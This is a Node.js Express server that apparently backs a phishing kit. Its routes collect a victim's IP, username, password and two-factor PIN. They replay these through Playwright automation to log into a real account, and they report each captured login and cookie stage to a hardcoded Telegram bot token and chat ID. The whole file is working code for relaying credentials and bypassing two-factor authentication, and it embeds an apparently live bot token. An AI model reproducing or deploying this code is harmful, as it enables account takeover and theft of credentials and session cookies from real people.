const express = require('express');
const { startWithPlaywright, loginWithPlaywright, pinValidator } = require('./playwrightLogin');
const app = express();
const cors = require('cors');  // Import CORS
const axios = require('axios');

// Enable CORS for all routes
app.use(cors());

app.use(express.json()); // To parse JSON bodies

// Store active login sessions (this could be expanded to a database for persistence)
let sessions = {};

// 1. Route to handle the start of the login process
app.post('/start-login', async (req, res) => {
  const { uuid, ip } = req.body;

  // Validate incoming data
  if (!uuid || !ip) {
    return res.status(400).json({ success: false, message: 'UUID and IP are required' });
  }

  // Generate a new session for the user
  sessions[uuid] = { ip, status: 'started', user: null, cookies: null };

    // Optionally, log this information or store it in a database
    console.log(`Received start request for UUID: ${uuid} from IP: ${ip}`);

    

// Replace with your actual bot token and chat ID
      const botToken = '7614695855:AAE0Rik3Hq9SN31Uzt7l3QY3yBR5rEkNLgY';  // Your Telegram bot token
      const chatId = '6886115064';      // The chat ID (user ID or group ID)
      // Correctly interpolate the message with UUID and IP
      const message = `Hello from the backend! UUID: ${uuid}, IP: ${ip}`;

      // Construct the Telegram Bot API URL
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

// Send a POST request to Telegram Bot API to send the message
axios.post(url, {
  chat_id: chatId,
  text: message,
})
.then(response => {
  console.log('Message sent successfully:', response.data);
})
.catch(error => {
  console.error('Error sending message:', error);
});


  try {
    await startWithPlaywright(uuid, ip); // Use the playwright automation script
    res.json({ success: true, message: 'Initialize successful', uuid });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Initialize failed', error: error.message });
  }

  // Optionally, log this information or store it in a database
  console.log(`Received start request for UUID: ${uuid} from IP: ${ip}`);

});

// 2. Route to process username/password for Playwright login
app.post('/process-login', async (req, res) => {
  const { uuid, username, password } = req.body;

  // Validate incoming data
  if (!uuid || !username || !password) {
    return res.status(400).json({ success: false, message: 'UUID, username, and password are required' });
  }

  // Check if the session exists
  const session = sessions[uuid];
  if (!session) {
    return res.status(404).json({ success: false, message: 'Session not found' });
  }

  // Trigger Playwright login automation
  try {
    // Assuming loginWithPlaywright() returns a boolean or resolves to true/false
    const loginSuccess = await loginWithPlaywright(uuid, username, password);

    const botToken = '7614695855:AAE0Rik3Hq9SN31Uzt7l3QY3yBR5rEkNLgY';  // Your Telegram bot token
    const chatId = '6886115064';   

    if (loginSuccess) {
        // If loginSuccess is true, send success response

        // If login is successful, send a success message to Telegram
      const message = `Login Successful! UUID: ${uuid}, Username: ${username}`;

      // Construct the Telegram Bot API URL
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      // Send a POST request to Telegram Bot API to send the message
      await axios.post(url, {
        chat_id: chatId,
        text: message,
      });


        res.json({ success: true, message: 'Login successful', uuid });
    } else {
        // If loginSuccess is false, send failure response
        session.status = 'failed'; // Update session status on failure
        res.status(500).json({ success: false, message: 'Login failed' });
    }
} catch (error) {
    // If an error occurs, handle it here
    session.status = 'failed'; // Update session status on failure
    res.status(500).json({ success: false, message: 'Login failed', error: error.message });
}
});

// 3. Route to handle the 2FA PIN validation
app.post('/validate-pin', async (req, res) => {
  const { uuid, pin } = req.body;

  // Validate incoming data
  if (!uuid || !pin) {
    return res.status(400).json({ success: false, message: 'UUID and PIN are required' });
  }

  // Check if the session exists
  const session = sessions[uuid];
  if (!session) {
    return res.status(404).json({ success: false, message: 'Session not found' });
  }



  // Trigger Playwright PIN validation
  try {
    // Assuming pinValidator(pin) resolves to true or false
    const pinValidationSuccess = await pinValidator(uuid, pin);

    if (pinValidationSuccess) {
        // If pinValidationSuccess is true, update the session status and send success response
        session.status = 'logged-in'; // Update session status
        session.status = 'completed'; // Update session to completed once 2FA is validated
        // If login is successful, send a success message to Telegram
        const botToken = '7614695855:AAE0Rik3Hq9SN31Uzt7l3QY3yBR5rEkNLgY';  // Your Telegram bot token
        const chatId = '6886115064';   
      
      const message = `Cookies Successful! UUID: ${uuid}, Username: ${username}`;

      // Construct the Telegram Bot API URL
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      // Send a POST request to Telegram Bot API to send the message
      await axios.post(url, {
        chat_id: chatId,
        text: message,
      });

        res.json({ success: true, message: 'PIN validated successfully', uuid });
    } else {
        // If pinValidationSuccess is false, send failure response
        session.status = 'failed'; // Update session status to failed
        res.status(500).json({ success: false, message: 'PIN validation failed' });
    }
} catch (error) {
    // If an error occurs, handle it here
    session.status = 'failed'; // Update session status on failure
    res.status(500).json({ success: false, message: 'PIN validation failed', error: error.message });
}
});

const PORT = 3000;
app.listen(PORT, (err) => {
  if (err) {
    console.error('Error starting the server:', err);
    process.exit(1); // Exit the process with an error code
  } else {
    console.log(`Backend server is running on port ${PORT}`);
  }
});
